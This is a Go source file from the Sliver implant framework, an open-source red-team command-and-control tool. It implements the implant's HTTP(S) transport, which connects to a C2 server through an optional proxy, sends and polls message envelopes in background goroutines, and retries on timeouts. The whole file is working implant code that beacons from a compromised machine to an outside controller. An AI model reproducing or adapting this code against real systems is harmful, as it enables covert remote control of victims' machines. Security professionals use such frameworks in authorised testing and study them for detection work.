package httpclient

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"net"
	"net/url"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// SetupConnectionHTTP - Wraps an HTTP client session into a logical Connection stream
func SetupConnectionHTTP(c2URI *url.URL, c2 *sliverpb.C2Profile) (*transports.Connection, error) {

	// {{if .Config.Debug}}
	log.Printf("Connecting -> http(s)://%s", c2URI.Host)
	// {{end}}
	proxyConfig := c2URI.Query().Get("proxy")
	timeout := time.Duration(c2.PollTimeout)
	client, err := HTTPStartSession(c2URI.Host, c2URI.Path, timeout, proxyConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("http(s) connection error %v", err)
		// {{end}}
		return nil, err
	}
	c2.ProxyURL = client.ProxyURL

	connection := transports.NewConnection()
	// var cleanup = func() {
	//         // {{if .Config.Debug}}
	//         log.Printf("[http] lost connection, cleanup...")
	//         // {{end}}
	//         // close(send)
	//         // ctrl <- true
	// }

	// send := make(chan *pb.Envelope)
	// recv := make(chan *pb.Envelope)
	// connection := &transports.Connection{
	//         Send:    send,
	//         Recv:    recv,
	//         ctrl:    ctrl,
	//         tunnels: &map[uint64]*Tunnel{},
	//         mutex:   &sync.RWMutex{},
	//         once:    &sync.Once{},
	//         IsOpen:  true,
	//         cleanup: func() {
	//                 // {{if .Config.Debug}}
	//                 log.Printf("[http] lost connection, cleanup...")
	//                 // {{end}}
	//                 close(send)
	//                 ctrl <- true
	//                 close(recv)
	//         },
	// }

	go func() {
		defer connection.Cleanup()
		for envelope := range connection.Send {
			// {{if .Config.Debug}}
			log.Printf("[http] send envelope ...")
			// {{end}}
			go client.WriteEnvelope(envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		errCount := 0 // Number of sequential errors
		for {
			select {
			// case <-ctrl:
			//         return
			default:
				envelope, err := client.ReadEnvelope()
				switch errType := err.(type) {
				case nil:
					errCount = 0
					if envelope != nil {
						connection.Recv <- envelope
					}
				case *url.Error:
					errCount++
					if err, ok := errType.Err.(net.Error); ok && err.Timeout() {
						// {{if .Config.Debug}}
						log.Printf("timeout error #%d", errCount)
						// {{end}}
						if errCount < int(c2.MaxConnectionErrors) {
							continue
						}
					}
					return
				case net.Error:
					errCount++
					if errType.Timeout() {
						// {{if .Config.Debug}}
						log.Printf("timeout error #%d", errCount)
						// {{end}}
						if errCount < int(c2.MaxConnectionErrors) {
							continue
						}
					}
					return
				default:
					errCount++
					// {{if .Config.Debug}}
					log.Printf("[http] error: %#v", err)
					// {{end}}
					return
				}
			}
		}
	}()

	return connection, nil
}
